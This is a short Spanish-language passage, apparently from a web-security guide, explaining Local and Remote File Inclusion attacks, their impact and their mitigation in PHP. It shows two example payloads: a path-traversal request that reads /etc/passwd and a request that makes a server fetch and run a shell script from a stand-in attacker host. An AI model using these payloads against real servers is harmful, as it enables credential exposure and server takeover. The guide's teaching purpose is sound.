Estos ataques ocurren cuando una aplicación incluye archivos en una página sin validación previa, permitiendo leer archivos locales o ejecutar archivos remotos.

### A. Funcionamiento técnico

- **LFI:** El atacante accede a archivos del sistema operativo.
    
    - _Ejemplo:_ `vulnerable.php?page=../../etc/passwd`.
        
- **RFI:** El atacante hace que el servidor descargue y ejecute un script desde un servidor externo.
    
    - _Ejemplo:_ `vulnerable.php?page=http://malware.com/shell.txt`.
        

### B. Impacto

- **LFI:** Exposición de archivos de configuración, credenciales y código fuente.
    
- **RFI:** **RCE (Remote Code Execution)** total. El atacante toma control del servidor.
    

### C. Mitigación

Configurar `allow_url_include = Off` en PHP, usar "listas blancas" para archivos permitidos y nunca usar entradas del usuario para construir rutas de archivos.

---
